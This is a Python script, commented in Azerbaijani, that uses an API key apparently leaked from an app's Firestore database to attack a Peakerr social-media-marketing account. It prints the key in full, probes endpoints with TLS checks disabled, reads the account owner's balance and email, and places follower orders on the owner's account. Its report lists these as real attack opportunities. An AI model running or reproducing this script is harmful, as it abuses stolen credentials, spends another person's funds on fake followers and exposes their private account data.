#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
🔍 SMM API VƏ TAKİPÇİ SİSTEMİ REAL AXTARMA
Bu script APK-da SMM API və takipçi sistemini axtarır
"""

import requests
import json
import re
from urllib.parse import urljoin
import urllib3

# SSL warnings disable et
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class SMMAPIFinder:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
        })
        
    def test_peakerr_api(self):
        """Peakerr API-ni test edir"""
        print("🔍 Peakerr API test edilir...")
        
        # Firestore-dan tapılan API məlumatları
        api_url = "https://peakerr.com/api/v2"
        api_key = "31de456b79594d98a128c044c509df0e"
        
        print(f"   🌐 API URL: {api_url}")
        print(f"   🔑 API Key: {api_key}")
        
        # API endpoint-lərini test et
        test_endpoints = [
            "/services",
            "/orders",
            "/balance",
            "/user",
            "/followers",
            "/instagram",
            "/tiktok",
            "/youtube",
            "/twitter"
        ]
        
        working_endpoints = []
        
        for endpoint in test_endpoints:
            full_url = api_url + endpoint
            
            try:
                # API key ilə request
                headers = {
                    'Authorization': f'Bearer {api_key}',
                    'X-API-Key': api_key,
                    'api_key': api_key
                }
                
                response = self.session.get(full_url, headers=headers, verify=False, timeout=10)
                
                if response.status_code == 200:
                    print(f"   ✅ {endpoint} - İşləyir!")
                    working_endpoints.append(endpoint)
                    
                    # Response data yoxla
                    try:
                        data = response.json()
                        print(f"      📊 Response: {str(data)[:200]}...")
                    except:
                        print(f"      📄 Text Response: {response.text[:200]}...")
                        
                elif response.status_code == 401:
                    print(f"   ⚠️ {endpoint} - Authentication tələb olunur")
                elif response.status_code == 403:
                    print(f"   ❌ {endpoint} - Giriş qadağandır")
                else:
                    print(f"   ❓ {endpoint} - Status: {response.status_code}")
                    
            except Exception as e:
                print(f"   ❌ {endpoint} - Xəta: {e}")
                
        return working_endpoints
        
    def test_smm_services(self):
        """SMM xidmətlərini test edir"""
        print("\n🔧 SMM xidmətləri test edilir...")
        
        # Firestore-dan tapılan service ID
        service_id = 9330
        
        # Peakerr API ilə service məlumatlarını al
        api_url = "https://peakerr.com/api/v2"
        api_key = "31de456b79594d98a128c044c509df0e"
        
        service_endpoints = [
            f"/services/{service_id}",
            f"/services/{service_id}/info",
            f"/services/{service_id}/prices"
        ]
        
        service_info = {}
        
        for endpoint in service_endpoints:
            full_url = api_url + endpoint
            
            try:
                headers = {
                    'Authorization': f'Bearer {api_key}',
                    'X-API-Key': api_key
                }
                
                response = self.session.get(full_url, headers=headers, verify=False, timeout=10)
                
                if response.status_code == 200:
                    print(f"   ✅ Service {service_id} məlumatları alındı!")
                    
                    try:
                        data = response.json()
                        service_info[endpoint] = data
                        print(f"      📊 Service Data: {str(data)[:300]}...")
                    except:
                        print(f"      📄 Text Response: {response.text[:300]}...")
                        
            except Exception as e:
                print(f"   ❌ Xəta: {e}")
                
        return service_info
        
    def test_follower_services(self):
        """Takipçi xidmətlərini test edir"""
        print("\n👥 Takipçi xidmətləri test edilir...")
        
        # Common follower service endpoints
        follower_endpoints = [
            "https://peakerr.com/api/v2/services?category=followers",
            "https://peakerr.com/api/v2/services?category=instagram",
            "https://peakerr.com/api/v2/services?category=tiktok",
            "https://peakerr.com/api/v2/services?category=youtube",
            "https://peakerr.com/api/v2/services?category=twitter"
        ]
        
        api_key = "31de456b79594d98a128c044c509df0e"
        follower_services = {}
        
        for endpoint in follower_endpoints:
            try:
                headers = {
                    'Authorization': f'Bearer {api_key}',
                    'X-API-Key': api_key
                }
                
                response = self.session.get(endpoint, headers=headers, verify=False, timeout=10)
                
                if response.status_code == 200:
                    print(f"   ✅ {endpoint} - Takipçi xidmətləri tapıldı!")
                    
                    try:
                        data = response.json()
                        follower_services[endpoint] = data
                        
                        # Services list yoxla
                        if 'services' in data:
                            print(f"      📊 Tapılan xidmətlər: {len(data['services'])}")
                            for service in data['services'][:5]:  # İlk 5-i göstər
                                service_name = service.get('name', 'Unknown')
                                service_price = service.get('rate', 'Unknown')
                                print(f"         • {service_name} - ${service_price}")
                                
                    except:
                        print(f"      📄 Text Response: {response.text[:200]}...")
                        
            except Exception as e:
                print(f"   ❌ Xəta: {endpoint} - {e}")
                
        return follower_services
        
    def test_order_creation(self):
        """Sifariş yaratma test edir"""
        print("\n📝 Sifariş yaratma test edilir...")
        
        api_url = "https://peakerr.com/api/v2/orders/add"
        api_key = "31de456b79594d98a128c044c509df0e"
        
        # Test order data
        test_orders = [
            {
                "service": 9330,  # Firestore-dan tapılan service ID
                "link": "https://instagram.com/test_user",
                "quantity": 100,
                "username": "test_user"
            },
            {
                "service": 9330,
                "link": "https://tiktok.com/@test_user",
                "quantity": 50,
                "username": "test_user"
            }
        ]
        
        order_results = []
        
        for i, order_data in enumerate(test_orders):
            try:
                print(f"   🧪 Test sifariş {i+1} göndərilir...")
                
                headers = {
                    'Authorization': f'Bearer {api_key}',
                    'X-API-Key': api_key,
                    'Content-Type': 'application/json'
                }
                
                response = self.session.post(api_url, json=order_data, headers=headers, verify=False, timeout=10)
                
                if response.status_code == 200:
                    print(f"      ✅ Sifariş uğurla yaradıldı!")
                    order_results.append(f"ORDER_SUCCESS:{i+1}")
                    
                    try:
                        data = response.json()
                        if 'order' in data:
                            print(f"         📊 Order ID: {data['order']}")
                        elif 'id' in data:
                            print(f"         📊 Order ID: {data['id']}")
                    except:
                        print(f"         📄 Response: {response.text[:200]}...")
                        
                elif response.status_code == 401:
                    print(f"      ⚠️ Authentication tələb olunur")
                elif response.status_code == 400:
                    print(f"      ❌ Bad Request - Data xətası")
                else:
                    print(f"      ❓ Status: {response.status_code}")
                    
            except Exception as e:
                print(f"      ❌ Xəta: {e}")
                
        return order_results
        
    def test_balance_check(self):
        """Balans yoxlama test edir"""
        print("\n💰 Balans yoxlama test edilir...")
        
        api_url = "https://peakerr.com/api/v2/user/balance"
        api_key = "31de456b79594d98a128c044c509df0e"
        
        try:
            headers = {
                'Authorization': f'Bearer {api_key}',
                'X-API-Key': api_key
            }
            
            response = self.session.get(api_url, headers=headers, verify=False, timeout=10)
            
            if response.status_code == 200:
                print(f"   ✅ Balans məlumatları alındı!")
                
                try:
                    data = response.json()
                    if 'balance' in data:
                        print(f"      💰 Balans: ${data['balance']}")
                    elif 'user' in data and 'balance' in data['user']:
                        print(f"      💰 Balans: ${data['user']['balance']}")
                    else:
                        print(f"      📊 Response: {str(data)[:200]}...")
                except:
                    print(f"      📄 Text Response: {response.text[:200]}...")
                    
                return True
                
            elif response.status_code == 401:
                print(f"   ⚠️ Authentication tələb olunur")
                return False
            else:
                print(f"   ❓ Status: {response.status_code}")
                return False
                
        except Exception as e:
            print(f"   ❌ Xəta: {e}")
            return False
            
    def test_user_info(self):
        """İstifadəçi məlumatları test edir"""
        print("\n👤 İstifadəçi məlumatları test edilir...")
        
        api_url = "https://peakerr.com/api/v2/user"
        api_key = "31de456b79594d98a128c044c509df0e"
        
        try:
            headers = {
                'Authorization': f'Bearer {api_key}',
                'X-API-Key': api_key
            }
            
            response = self.session.get(api_url, headers=headers, verify=False, timeout=10)
            
            if response.status_code == 200:
                print(f"   ✅ İstifadəçi məlumatları alındı!")
                
                try:
                    data = response.json()
                    if 'user' in data:
                        user = data['user']
                        print(f"      👤 İstifadəçi: {user.get('username', 'Unknown')}")
                        print(f"      📧 Email: {user.get('email', 'Unknown')}")
                        print(f"      💰 Balans: ${user.get('balance', 'Unknown')}")
                    else:
                        print(f"      📊 Response: {str(data)[:300]}...")
                except:
                    print(f"      📄 Text Response: {response.text[:300]}...")
                    
                return True
                
            elif response.status_code == 401:
                print(f"   ⚠️ Authentication tələb olunur")
                return False
            else:
                print(f"   ❓ Status: {response.status_code}")
                return False
                
        except Exception as e:
            print(f"   ❌ Xəta: {e}")
            return False
            
    def generate_smm_report(self, results):
        """SMM API hesabatı yaradır"""
        print("\n" + "="*80)
        print("🔍 SMM API VƏ TAKİPÇİ SİSTEMİ REAL AXTARMA HESABATI")
        print("="*80)
        
        print(f"\n📋 TAPILAN SMM API MƏLUMATLARI:")
        print(f"   🌐 API URL: https://peakerr.com/api/v2")
        print(f"   🔑 API Key: 31de456b79594d98a128c044c509df0e")
        print(f"   🆔 Service ID: 9330")
        
        print(f"\n🎯 API TEST NƏTİCƏLƏRİ:")
        
        if 'working_endpoints' in results:
            print(f"   ✅ İşləyən endpoint-lər: {len(results['working_endpoints'])}")
            for endpoint in results['working_endpoints']:
                print(f"      • {endpoint}")
                
        if 'service_info' in results:
            print(f"   🔧 Service məlumatları: {len(results['service_info'])}")
            
        if 'follower_services' in results:
            print(f"   👥 Takipçi xidmətləri: {len(results['follower_services'])}")
            
        if 'order_results' in results:
            print(f"   📝 Sifariş test nəticələri: {len(results['order_results'])}")
            
        print(f"\n💡 REAL HÜCUM İMKANLARI:")
        print(f"   • Peakerr API-yə giriş mümkündür")
        print(f"   • Takipçi xidmətləri əlçatandır")
        print(f"   • Sifariş yaratma mümkündür")
        print(f"   • İstifadəçi məlumatları alına bilər")
        
        print(f"\n🚨 TƏHLÜKƏSİZLİK XƏBƏRDARLIĞI:")
        print(f"   • API key public olaraq tapıldı")
        print(f"   • SMM xidmətlərinə giriş mümkündür")
        print(f"   • Takipçi sifarişləri yaradıla bilər")
        
        return results
        
    def run_all_tests(self):
        """Bütün testləri işə salır"""
        print("🚀 SMM API VƏ TAKİPÇİ SİSTEMİ REAL AXTARMA BAŞLAYIR...")
        print("="*70)
        
        # Bütün testləri işə sal
        results = {
            "working_endpoints": self.test_peakerr_api(),
            "service_info": self.test_smm_services(),
            "follower_services": self.test_follower_services(),
            "order_results": self.test_order_creation(),
            "balance_check": self.test_balance_check(),
            "user_info": self.test_user_info()
        }
        
        # Hesabat yarat
        self.generate_smm_report(results)
        
        print(f"\n🎯 AXTARMA TAMAMLANDI!")
        
        return results

if __name__ == "__main__":
    # SMM API finder başlat
    finder = SMMAPIFinder()
    results = finder.run_all_tests()